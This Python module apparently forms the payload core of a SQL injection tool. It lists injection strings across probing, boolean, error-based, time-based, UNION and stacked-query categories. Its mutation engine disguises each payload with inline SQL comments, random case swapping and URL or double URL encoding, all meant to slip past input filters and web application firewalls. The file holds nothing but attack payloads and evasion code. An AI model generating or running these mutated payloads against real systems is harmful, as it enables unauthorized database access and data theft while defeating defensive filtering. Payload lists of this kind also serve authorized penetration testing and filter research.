"""Payload database with polymorphic mutation engine."""

import random
from collections import defaultdict

PAYLOAD_TEMPLATES = {
    "syntax_probe": [
        "'", "\"", "')", "'))", "\'", "%27", "%22",
        "1'", "1\"", "1')",
    ],
    "boolean_true": [
        "' OR 1=1 -- ", "' OR 1=1 #", "' OR 'a'='a' -- ",
        "admin' OR '1'='1' -- ", "\" OR 1=1 -- ",
        "' AND 1=1 -- ", "' AND 1=1 #", "admin' -- ",
        "' UNION SELECT 1,1,1 WHERE 1=1 -- ",
        "' OR 1=1-- ", "' OR 1=1 /* */",
    ],
    "boolean_false": [
        "' OR 1=2 -- ", "' AND 1=2 -- ",
        "' OR 'a'='b' -- ", "' OR 1=0 -- ",
    ],
    "error_based": [
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) -- ",
        "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1) -- ",
        "1' AND 1=CONVERT(INT, (SELECT @@VERSION)) -- ",
        "1' OR 1/@@VERSION -- ",
        "' OR CAST((SELECT VERSION()) AS NUMERIC) -- ",
        "' AND (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) -- ",
    ],
    "time_based": [
        "' OR SLEEP(5) -- ", "' AND SLEEP(5) -- ",
        "' OR (SELECT SLEEP(5)) -- ",
        "1' OR pg_sleep(5) -- ",
        "1'; WAITFOR DELAY '0:0:5' -- ",
        "1' OR WAITFOR DELAY '0:0:5' -- ",
        "1' AND BENCHMARK(5000000,MD5('test')) -- ",
        "1' OR (SELECT dbms_lock.sleep(5) FROM dual) -- ",
    ],
    "union_probe": [
        "' UNION SELECT NULL -- ",
        "' UNION SELECT NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
        "' UNION SELECT 1,2,3 -- ",
        "' UNION SELECT VERSION(),2,3 -- ",
        "' UNION SELECT @@VERSION,2,3 -- ",
        "1' ORDER BY 1 -- ", "1' ORDER BY 100 -- ",
    ],
    "stacked_query": [
        "1'; SELECT SLEEP(3) -- ",
        "1'; WAITFOR DELAY '0:0:3' -- ",
        "1'; SELECT pg_sleep(3) -- ",
    ],
    "header_injection": [
        "' OR SLEEP(3) -- ", "' OR 1=1 -- ",
        "' UNION SELECT NULL -- ",
    ],
}

COMMENT_CHUNKS = ["/**/", "/*!*/", "/*!12345*/", "/*!99999*/", "/*+-*/"]
WHITESPACE = ["%09", "%0a", "%0d", "\t", "  "]

def mutate_payload(payload: str, complexity: int = 2) -> str:
    result = payload
    if complexity >= 1:
        keywords = ["SELECT", "UNION", "OR", "AND", "SLEEP", "WHERE", "FROM"]
        for kw in keywords:
            idx = result.upper().find(kw.upper())
            if idx >= 0 and len(kw) > 2:
                pos = idx + random.randint(1, len(kw) - 1)
                result = result[:pos] + random.choice(COMMENT_CHUNKS) + result[pos:]
                if random.random() < 0.3:
                    break
    if complexity >= 2:
        chars = list(result)
        for i in range(len(chars)):
            if chars[i].isalpha() and random.random() < 0.35:
                chars[i] = chars[i].swapcase()
        result = "".join(chars)
    if complexity >= 1 and random.random() < 0.4:
        result = result.replace("'", random.choice(["%27", "%2527", "\'"]))
    return result

def generate_payloads() -> list:
    payloads = []
    seen = set()
    for category, templates in PAYLOAD_TEMPLATES.items():
        for template in templates:
            payloads.append({"value": template, "category": category})
            for _ in range(2):
                mutated = mutate_payload(template, random.randint(2, 3))
                if mutated != template and mutated not in seen:
                    seen.add(mutated)
                    payloads.append({"value": mutated, "category": category})
    random.shuffle(payloads)
    return payloads

ALL_PAYLOADS = generate_payloads()
